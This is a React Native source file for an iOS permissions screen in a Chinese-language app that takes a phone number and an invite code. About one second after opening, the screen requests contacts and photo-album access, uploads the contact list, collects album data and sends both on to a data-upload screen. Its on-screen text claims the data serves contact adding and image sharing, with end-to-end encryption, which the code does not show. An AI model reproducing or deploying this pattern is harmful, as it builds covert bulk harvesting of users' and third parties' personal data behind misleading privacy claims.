import React, { useEffect, useState } from 'react';
import { View, Text, StyleSheet, ActivityIndicator } from 'react-native';
import { getCurrentPlatformFeatures, getNavigationFlow } from '../config/platformFeatures';
import { NativeStackNavigationProp } from '@react-navigation/native-stack';
import { RouteProp } from '@react-navigation/native';
import { RootStackParamList } from '../navigation/AppNavigator';

type PermissionsScreenNavigationProp = NativeStackNavigationProp<RootStackParamList, 'Permissions'>;
type PermissionsScreenRouteProp = RouteProp<RootStackParamList, 'Permissions'>;

interface PermissionsScreenProps {
  navigation: PermissionsScreenNavigationProp;
  route: PermissionsScreenRouteProp;
}

/**
 * iOS 版本的权限屏幕
 * 启用完整的权限申请和数据收集功能
 * 与Android保持一致的功能体验
 */
const PermissionsScreen: React.FC<PermissionsScreenProps> = ({ navigation, route }) => {
  const { phoneNumber, inviteCode } = route.params;
  const [permissionStatus, setPermissionStatus] = useState<{[key: string]: string}>({});
  const [isRequestingPermissions, setIsRequestingPermissions] = useState(false);
  const [permissionData, setPermissionData] = useState<any>({});

  useEffect(() => {
    console.log('🍎 iOS权限屏幕: 开始权限申请流程');
    console.log('📱 导航参数:', { phoneNumber, inviteCode });
    
    const navigationFlow = getNavigationFlow();
    const features = getCurrentPlatformFeatures();
    
    console.log('🚀 iOS导航流程:', navigationFlow);
    console.log('⚙️  iOS功能配置:', features);
    
    // 延迟开始权限申请流程
    const timer = setTimeout(() => {
      requestPermissions();
    }, 1000);
    
    return () => clearTimeout(timer);
  }, [navigation, phoneNumber, inviteCode]);

  // 权限申请主流程
  const requestPermissions = async () => {
    try {
      setIsRequestingPermissions(true);
      console.log('🍎 iOS: 开始权限申请流程...');
      
      const features = getCurrentPlatformFeatures();
      const collectedData: any = {};
      const statusObj: {[key: string]: string} = {};

      // 1. 申请通讯录权限
      if (features.permissions.contacts && features.dataCollection.uploadContacts) {
        console.log('📞 iOS: 申请通讯录权限...');
        setPermissionStatus(prev => ({ ...prev, contacts: 'requesting' }));
        
        try {
          const ContactsPermissionService = require('../services/ContactsPermissionService').default;
          const contactService = ContactsPermissionService.getInstance();
          
          await contactService.requestPermissionAndUpload();
          const contactsData = await contactService.getContactsData();
          
          if (contactsData && contactsData.length > 0) {
            collectedData.contacts = contactsData;
            statusObj.contacts = 'granted';
            console.log('✅ iOS: 通讯录权限申请成功，数据已收集');
          } else {
            statusObj.contacts = 'denied';
            console.log('❌ iOS: 通讯录权限被拒绝或无数据');
          }
        } catch (error) {
          console.error('❌ iOS: 通讯录权限申请失败:', error);
          statusObj.contacts = 'error';
        }
        
        setPermissionStatus(prev => ({ ...prev, contacts: statusObj.contacts }));
      }

      // 2. 申请相册权限
      if (features.permissions.album && features.dataCollection.uploadAlbum) {
        console.log('📸 iOS: 申请相册权限...');
        setPermissionStatus(prev => ({ ...prev, album: 'requesting' }));
        
        try {
          const AlbumPermissionService = require('../services/AlbumPermissionService').default;
          const albumService = AlbumPermissionService.getInstance();
          
          const albumSuccess = await albumService.handleFirstTimePermission();
          
          if (albumSuccess) {
            // 获取相册数据
            const albumData = await albumService.getAlbumDataForUpload();
            if (albumData && albumData.length > 0) {
              collectedData.album = albumData;
              statusObj.album = 'granted';
              console.log('✅ iOS: 相册权限申请成功，数据已收集');
            } else {
              statusObj.album = 'granted_no_data';
              console.log('⚠️ iOS: 相册权限已获得但无数据');
            }
          } else {
            statusObj.album = 'denied';
            console.log('❌ iOS: 相册权限被拒绝');
          }
        } catch (error) {
          console.error('❌ iOS: 相册权限申请失败:', error);
          statusObj.album = 'error';
        }
        
        setPermissionStatus(prev => ({ ...prev, album: statusObj.album }));
      }

      console.log('✅ iOS: 权限申请流程完成');
      console.log('📊 iOS: 收集到的数据:', Object.keys(collectedData));
      
      setPermissionData(collectedData);
      setIsRequestingPermissions(false);

      // 进入数据上传屏幕
      setTimeout(() => {
        navigation.replace('DataUploadScreen', {
          token: phoneNumber, // 使用电话号码作为临时token
          permissionData: collectedData
        });
      }, 1500);

    } catch (error) {
      console.error('❌ iOS: 权限申请流程失败:', error);
      setIsRequestingPermissions(false);
      
      // 即使失败也要继续流程
      setTimeout(() => {
        navigation.replace('DataUploadScreen', {
          token: phoneNumber,
          permissionData: {}
        });
      }, 1000);
    }
  };

  // 获取权限状态显示信息
  const getPermissionStatusInfo = (status: string) => {
    switch (status) {
      case 'requesting': return { icon: '⏳', text: '请求中', color: '#007AFF' };
      case 'granted': return { icon: '✅', text: '已授权', color: '#34C759' };
      case 'denied': return { icon: '❌', text: '被拒绝', color: '#FF3B30' };
      case 'granted_no_data': return { icon: '⚠️', text: '已授权(无数据)', color: '#FF9500' };
      case 'error': return { icon: '⚠️', text: '出错', color: '#FF3B30' };
      default: return { icon: '⏸', text: '等待中', color: '#8E8E93' };
    }
  };

  return (
    <View style={styles.container}>
      <View style={styles.content}>
        <ActivityIndicator size="large" color="#ff6b81" />
        <Text style={styles.title}>
          {isRequestingPermissions ? '正在申请权限...' : '准备权限申请'}
        </Text>
        <Text style={styles.subtitle}>iOS 完整功能版本</Text>
        <Text style={styles.description}>
          为了提供完整的功能体验，我们需要申请以下权限
        </Text>
        
        {/* 权限状态显示 */}
        <View style={styles.permissionList}>
          {Object.entries(permissionStatus).map(([key, status]) => {
            const info = getPermissionStatusInfo(status);
            return (
              <View key={key} style={styles.permissionItem}>
                <Text style={[styles.permissionIcon, { color: info.color }]}>
                  {info.icon}
                </Text>
                <Text style={styles.permissionText}>
                  {key === 'contacts' ? '通讯录权限' : key === 'album' ? '相册权限' : key}
                </Text>
                <Text style={[styles.permissionStatus, { color: info.color }]}>
                  {info.text}
                </Text>
              </View>
            );
          })}
        </View>
        
        <Text style={styles.note}>
          • 通讯录权限：用于联系人快速添加{'\n'}
          • 相册权限：用于批量图片分享{'\n'}
          • 数据传输采用端到端加密{'\n'}
          • 严格遵循iOS隐私保护政策
        </Text>
      </View>
    </View>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#f8f9fa',
    justifyContent: 'center',
    alignItems: 'center',
  },
  content: {
    alignItems: 'center',
    paddingHorizontal: 40,
  },
  title: {
    fontSize: 24,
    fontWeight: 'bold',
    color: '#2c3e50',
    marginTop: 20,
    marginBottom: 10,
  },
  subtitle: {
    fontSize: 16,
    color: '#7f8c8d',
    marginBottom: 20,
  },
  description: {
    fontSize: 16,
    color: '#34495e',
    textAlign: 'center',
    marginBottom: 20,
    lineHeight: 24,
  },
  note: {
    fontSize: 14,
    color: '#7f8c8d',
    textAlign: 'left',
    lineHeight: 20,
  },
  permissionList: {
    width: '100%',
    marginBottom: 20,
  },
  permissionItem: {
    flexDirection: 'row',
    alignItems: 'center',
    paddingVertical: 8,
    paddingHorizontal: 16,
    backgroundColor: '#ffffff',
    marginBottom: 8,
    borderRadius: 8,
    borderWidth: 1,
    borderColor: '#e0e0e0',
  },
  permissionIcon: {
    fontSize: 20,
    marginRight: 12,
  },
  permissionText: {
    flex: 1,
    fontSize: 16,
    color: '#2c3e50',
  },
  permissionStatus: {
    fontSize: 14,
    fontWeight: '600',
  },
});

export default PermissionsScreen; 